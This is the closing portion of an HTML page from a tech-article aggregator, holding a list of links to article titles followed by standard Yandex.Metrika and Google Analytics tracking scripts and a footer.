<li><a href="../257947/index.html">Developing an IR remote control for a camera</a></li>
<li><a href="../257949/index.html">Distributed transactions between RabbitMQ and MS SQL</a></li>
<li><a href="../257953/index.html">About household misconceptions</a></li>
<li><a href="../257955/index.html">Personal data: dura lex, sed lex</a></li>
<li><a href="../257957/index.html">About alternative education in general and about C # in particular</a></li>
<li><a href="../257959/index.html">Conference YAPC :: Russia :: MayPerl 2015 in Moscow on May 16-17, do not miss</a></li>
<li><a href="../257965/index.html">Adobe has released a set of updates for its products.</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>